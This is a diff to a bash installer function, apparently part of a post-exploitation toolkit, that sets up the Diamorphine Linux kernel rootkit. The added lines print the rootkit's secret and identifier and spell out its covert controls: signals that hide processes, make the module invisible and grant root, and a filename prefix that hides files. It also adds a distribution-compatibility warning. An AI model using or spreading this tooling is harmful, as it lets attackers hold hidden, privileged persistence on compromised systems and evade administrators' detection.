@@ -22,6 +22,7 @@ setup_rootkit() {
 		echo "--examples                 Display command examples"
 		echo "--secret <secret>          Specify the secret"
 		echo "--identifier <identifier>  Specify the identifies"
+		echo "--help|-h                  Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -80,6 +81,11 @@ setup_rootkit() {
 		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install kernel-devel"
 		exit 1
 	fi
+
+    echo "[!] There are known issues with the Diamorphine rootkit for Ubuntu 22.04"
+    echo "[!] This module is tested on Debian 11, 12, RHEL 9, CentOS Stream 9 and CentOS 7"
+    echo "[!] I cannot guarantee that it will work on other distributions"
+    sleep 5
 
     mkdir -p $rk_path
 
@@ -182,4 +188,12 @@ setup_rootkit() {
 	make -C ${rk_path} clean
 
 	echo "[+] Diamorphine rootkit has been installed."
+    echo "[+] The secret is: ${secret}"
+    echo "[+] The identifier is: ${identifier}"
+
+    echo "[+] kill -31 pid: hide/unhide any process;"
+    echo "[+] kill -63 pid: turns the module (in)visible;"
+    echo "[+] kill -64 pid: become root;"
+    echo "[+] Any file starting with ${secret} is hidden."
+    echo "[+] Source: https://github.com/m0nad/Diamorphine"
 }
